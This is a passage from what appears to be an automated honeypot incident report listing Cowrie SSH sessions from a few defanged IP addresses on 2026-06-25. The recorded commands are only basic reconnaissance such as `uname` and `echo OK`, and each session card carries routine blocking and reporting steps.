| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:23:16` | `cowrie.session.connect` |
| `2026-06-25 16:23:16` | `cowrie.client.version` |
| `2026-06-25 16:23:16` | `cowrie.client.kex` |
| `2026-06-25 16:23:16` | `cowrie.login.success` |
| `2026-06-25 16:23:17` | `cowrie.session.params` |
| `2026-06-25 16:23:17` | `cowrie.command.input` |
| `2026-06-25 16:23:17` | `cowrie.log.closed` |
| `2026-06-25 16:23:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49db7a3312d7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:24 |
| **Last Seen** | 2026-06-25 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:24:04` | `cowrie.session.connect` |
| `2026-06-25 16:24:04` | `cowrie.client.version` |
| `2026-06-25 16:24:04` | `cowrie.client.kex` |
| `2026-06-25 16:24:04` | `cowrie.login.success` |
| `2026-06-25 16:24:05` | `cowrie.session.params` |
| `2026-06-25 16:24:05` | `cowrie.command.input` |
| `2026-06-25 16:24:05` | `cowrie.log.closed` |
| `2026-06-25 16:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cfdd28d66b8

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 16:24 |
| **Last Seen** | 2026-06-25 16:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:24:07` | `cowrie.session.connect` |
| `2026-06-25 16:24:07` | `cowrie.client.version` |
| `2026-06-25 16:24:07` | `cowrie.client.kex` |
| `2026-06-25 16:24:09` | `cowrie.login.success` |
| `2026-06-25 16:24:11` | `cowrie.session.params` |
| `2026-06-25 16:24:11` | `cowrie.command.input` |
| `2026-06-25 16:24:11` | `cowrie.log.closed` |
| `2026-06-25 16:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc59296625c0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:24 |
| **Last Seen** | 2026-06-25 16:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:24:50` | `cowrie.session.connect` |
| `2026-06-25 16:24:50` | `cowrie.client.version` |
| `2026-06-25 16:24:50` | `cowrie.client.kex` |
| `2026-06-25 16:24:51` | `cowrie.login.success` |
| `2026-06-25 16:24:51` | `cowrie.session.params` |
| `2026-06-25 16:24:51` | `cowrie.command.input` |
| `2026-06-25 16:24:52` | `cowrie.log.closed` |
| `2026-06-25 16:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6ed0bb9b12

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:25 |
| **Last Seen** | 2026-06-25 16:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:25:37` | `cowrie.session.connect` |
| `2026-06-25 16:25:37` | `cowrie.client.version` |
| `2026-06-25 16:25:37` | `cowrie.client.kex` |
| `2026-06-25 16:25:37` | `cowrie.login.success` |
| `2026-06-25 16:25:38` | `cowrie.session.params` |
| `2026-06-25 16:25:38` | `cowrie.command.input` |
| `2026-06-25 16:25:38` | `cowrie.log.closed` |
| `2026-06-25 16:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19494b3c285

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:26 |
| **Last Seen** | 2026-06-25 16:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:26:30` | `cowrie.session.connect` |
| `2026-06-25 16:26:30` | `cowrie.client.version` |
| `2026-06-25 16:26:30` | `cowrie.client.kex` |
| `2026-06-25 16:26:30` | `cowrie.login.success` |
| `2026-06-25 16:26:31` | `cowrie.session.params` |
| `2026-06-25 16:26:31` | `cowrie.command.input` |
| `2026-06-25 16:26:31` | `cowrie.log.closed` |
| `2026-06-25 16:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e762215410

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:27 |
| **Last Seen** | 2026-06-25 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:27:23` | `cowrie.session.connect` |
| `2026-06-25 16:27:23` | `cowrie.client.version` |
| `2026-06-25 16:27:23` | `cowrie.client.kex` |
| `2026-06-25 16:27:23` | `cowrie.login.success` |
| `2026-06-25 16:27:24` | `cowrie.session.params` |
| `2026-06-25 16:27:24` | `cowrie.command.input` |
| `2026-06-25 16:27:24` | `cowrie.log.closed` |
| `2026-06-25 16:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-323743d58181

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:28 |
| **Last Seen** | 2026-06-25 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:28:12` | `cowrie.session.connect` |
| `2026-06-25 16:28:12` | `cowrie.client.version` |
| `2026-06-25 16:28:12` | `cowrie.client.kex` |
| `2026-06-25 16:28:13` | `cowrie.login.success` |
| `2026-06-25 16:28:13` | `cowrie.session.params` |
| `2026-06-25 16:28:13` | `cowrie.command.input` |
| `2026-06-25 16:28:14` | `cowrie.log.closed` |
| `2026-06-25 16:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16fa69431a32

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:29 |
| **Last Seen** | 2026-06-25 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:29:01` | `cowrie.session.connect` |
| `2026-06-25 16:29:01` | `cowrie.client.version` |
| `2026-06-25 16:29:01` | `cowrie.client.kex` |
| `2026-06-25 16:29:01` | `cowrie.login.success` |
| `2026-06-25 16:29:02` | `cowrie.session.params` |
| `2026-06-25 16:29:02` | `cowrie.command.input` |
| `2026-06-25 16:29:02` | `cowrie.log.closed` |
| `2026-06-25 16:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5db8373becc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:29 |
| **Last Seen** | 2026-06-25 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:29:49` | `cowrie.session.connect` |
| `2026-06-25 16:29:49` | `cowrie.client.version` |
| `2026-06-25 16:29:49` | `cowrie.client.kex` |
| `2026-06-25 16:29:49` | `cowrie.login.success` |
| `2026-06-25 16:29:50` | `cowrie.session.params` |
| `2026-06-25 16:29:50` | `cowrie.command.input` |
| `2026-06-25 16:29:50` | `cowrie.log.closed` |
| `2026-06-25 16:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44f1018021a2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:30 |
| **Last Seen** | 2026-06-25 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:30:38` | `cowrie.session.connect` |
| `2026-06-25 16:30:38` | `cowrie.client.version` |
| `2026-06-25 16:30:39` | `cowrie.client.kex` |
| `2026-06-25 16:30:39` | `cowrie.login.success` |
| `2026-06-25 16:30:40` | `cowrie.session.params` |
| `2026-06-25 16:30:40` | `cowrie.command.input` |
| `2026-06-25 16:30:40` | `cowrie.log.closed` |
| `2026-06-25 16:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dfbe7001e44

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:31 |
| **Last Seen** | 2026-06-25 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:31:27` | `cowrie.session.connect` |
| `2026-06-25 16:31:27` | `cowrie.client.version` |
| `2026-06-25 16:31:27` | `cowrie.client.kex` |
| `2026-06-25 16:31:28` | `cowrie.login.success` |
| `2026-06-25 16:31:28` | `cowrie.session.params` |
| `2026-06-25 16:31:28` | `cowrie.command.input` |
| `2026-06-25 16:31:29` | `cowrie.log.closed` |
| `2026-06-25 16:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ac5aaea137

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:32 |
| **Last Seen** | 2026-06-25 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:32:15` | `cowrie.session.connect` |
| `2026-06-25 16:32:15` | `cowrie.client.version` |
| `2026-06-25 16:32:15` | `cowrie.client.kex` |
| `2026-06-25 16:32:15` | `cowrie.login.success` |
| `2026-06-25 16:32:16` | `cowrie.session.params` |
| `2026-06-25 16:32:16` | `cowrie.command.input` |
| `2026-06-25 16:32:16` | `cowrie.log.closed` |
| `2026-06-25 16:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0523d0a19af

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 16:32 |
| **Last Seen** | 2026-06-25 16:32 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:32:41` | `cowrie.session.connect` |
| `2026-06-25 16:32:42` | `cowrie.client.version` |
| `2026-06-25 16:32:42` | `cowrie.client.kex` |
| `2026-06-25 16:32:50` | `cowrie.login.success` |
| `2026-06-25 16:32:53` | `cowrie.session.params` |
| `2026-06-25 16:32:53` | `cowrie.command.input` |
| `2026-06-25 16:32:55` | `cowrie.log.closed` |
| `2026-06-25 16:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eef14b4f3117

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:33 |
| **Last Seen** | 2026-06-25 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:33:04` | `cowrie.session.connect` |
| `2026-06-25 16:33:04` | `cowrie.client.version` |
| `2026-06-25 16:33:04` | `cowrie.client.kex` |
| `2026-06-25 16:33:04` | `cowrie.login.success` |
| `2026-06-25 16:33:05` | `cowrie.session.params` |
| `2026-06-25 16:33:05` | `cowrie.command.input` |
| `2026-06-25 16:33:05` | `cowrie.log.closed` |
| `2026-06-25 16:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4daf5139a94

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:33 |
| **Last Seen** | 2026-06-25 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:33:57` | `cowrie.session.connect` |
| `2026-06-25 16:33:57` | `cowrie.client.version` |
| `2026-06-25 16:33:57` | `cowrie.client.kex` |
| `2026-06-25 16:33:58` | `cowrie.login.success` |
| `2026-06-25 16:33:58` | `cowrie.session.params` |
| `2026-06-25 16:33:58` | `cowrie.command.input` |
| `2026-06-25 16:33:59` | `cowrie.log.closed` |
| `2026-06-25 16:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5e7dad2a0c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:34 |
| **Last Seen** | 2026-06-25 16:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:34:48` | `cowrie.session.connect` |
| `2026-06-25 16:34:48` | `cowrie.client.version` |
| `2026-06-25 16:34:48` | `cowrie.client.kex` |
| `2026-06-25 16:34:48` | `cowrie.login.success` |
| `2026-06-25 16:34:49` | `cowrie.session.params` |
| `2026-06-25 16:34:49` | `cowrie.command.input` |
| `2026-06-25 16:34:49` | `cowrie.log.closed` |
| `2026-06-25 16:34:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31a6b6b9cbde

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:35 |
| **Last Seen** | 2026-06-25 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:35:37` | `cowrie.session.connect` |
| `2026-06-25 16:35:37` | `cowrie.client.version` |
| `2026-06-25 16:35:37` | `cowrie.client.kex` |
| `2026-06-25 16:35:37` | `cowrie.login.success` |
| `2026-06-25 16:35:38` | `cowrie.session.params` |
| `2026-06-25 16:35:38` | `cowrie.command.input` |
| `2026-06-25 16:35:38` | `cowrie.log.closed` |
| `2026-06-25 16:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2653e00f8e65

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:36 |
| **Last Seen** | 2026-06-25 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:36:26` | `cowrie.session.connect` |
| `2026-06-25 16:36:26` | `cowrie.client.version` |
| `2026-06-25 16:36:26` | `cowrie.client.kex` |
| `2026-06-25 16:36:27` | `cowrie.login.success` |
| `2026-06-25 16:36:27` | `cowrie.session.params` |
| `2026-06-25 16:36:27` | `cowrie.command.input` |
| `2026-06-25 16:36:27` | `cowrie.log.closed` |
| `2026-06-25 16:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b89f8a12e4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:37 |
| **Last Seen** | 2026-06-25 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:37:18` | `cowrie.session.connect` |
| `2026-06-25 16:37:18` | `cowrie.client.version` |
| `2026-06-25 16:37:19` | `cowrie.client.kex` |
| `2026-06-25 16:37:19` | `cowrie.login.success` |
| `2026-06-25 16:37:20` | `cowrie.session.params` |
| `2026-06-25 16:37:20` | `cowrie.command.input` |
| `2026-06-25 16:37:20` | `cowrie.log.closed` |
| `2026-06-25 16:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc75b3835f5f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:38 |
| **Last Seen** | 2026-06-25 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:38:08` | `cowrie.session.connect` |
| `2026-06-25 16:38:08` | `cowrie.client.version` |
| `2026-06-25 16:38:08` | `cowrie.client.kex` |
| `2026-06-25 16:38:09` | `cowrie.login.success` |
| `2026-06-25 16:38:09` | `cowrie.session.params` |
| `2026-06-25 16:38:09` | `cowrie.command.input` |
| `2026-06-25 16:38:09` | `cowrie.log.closed` |
| `2026-06-25 16:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24df08834d1

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 16:38 |
| **Last Seen** | 2026-06-25 16:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:38:39` | `cowrie.session.connect` |
| `2026-06-25 16:38:39` | `cowrie.client.version` |
| `2026-06-25 16:38:39` | `cowrie.client.kex` |
| `2026-06-25 16:38:41` | `cowrie.login.success` |
| `2026-06-25 16:38:43` | `cowrie.session.params` |
| `2026-06-25 16:38:43` | `cowrie.command.input` |
| `2026-06-25 16:38:43` | `cowrie.log.closed` |
| `2026-06-25 16:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a760ca2609cb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:39 |
| **Last Seen** | 2026-06-25 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:39:00` | `cowrie.session.connect` |
| `2026-06-25 16:39:00` | `cowrie.client.version` |
| `2026-06-25 16:39:00` | `cowrie.client.kex` |
| `2026-06-25 16:39:00` | `cowrie.login.success` |
| `2026-06-25 16:39:01` | `cowrie.session.params` |
| `2026-06-25 16:39:01` | `cowrie.command.input` |
| `2026-06-25 16:39:01` | `cowrie.log.closed` |
| `2026-06-25 16:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-096fba7f349f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:39 |
| **Last Seen** | 2026-06-25 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:39:51` | `cowrie.session.connect` |
| `2026-06-25 16:39:51` | `cowrie.client.version` |
| `2026-06-25 16:39:51` | `cowrie.client.kex` |
| `2026-06-25 16:39:51` | `cowrie.login.success` |
| `2026-06-25 16:39:52` | `cowrie.session.params` |
| `2026-06-25 16:39:52` | `cowrie.command.input` |
| `2026-06-25 16:39:52` | `cowrie.log.closed` |
| `2026-06-25 16:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daf4ae9dc4c6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:40 |
| **Last Seen** | 2026-06-25 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:40:42` | `cowrie.session.connect` |
| `2026-06-25 16:40:42` | `cowrie.client.version` |
| `2026-06-25 16:40:42` | `cowrie.client.kex` |
| `2026-06-25 16:40:42` | `cowrie.login.success` |
| `2026-06-25 16:40:43` | `cowrie.session.params` |
| `2026-06-25 16:40:43` | `cowrie.command.input` |
| `2026-06-25 16:40:43` | `cowrie.log.closed` |
| `2026-06-25 16:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c90595fed0e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:41 |
| **Last Seen** | 2026-06-25 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:41:32` | `cowrie.session.connect` |
| `2026-06-25 16:41:32` | `cowrie.client.version` |
| `2026-06-25 16:41:32` | `cowrie.client.kex` |
| `2026-06-25 16:41:33` | `cowrie.login.success` |
| `2026-06-25 16:41:33` | `cowrie.session.params` |
| `2026-06-25 16:41:33` | `cowrie.command.input` |
| `2026-06-25 16:41:34` | `cowrie.log.closed` |
| `2026-06-25 16:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
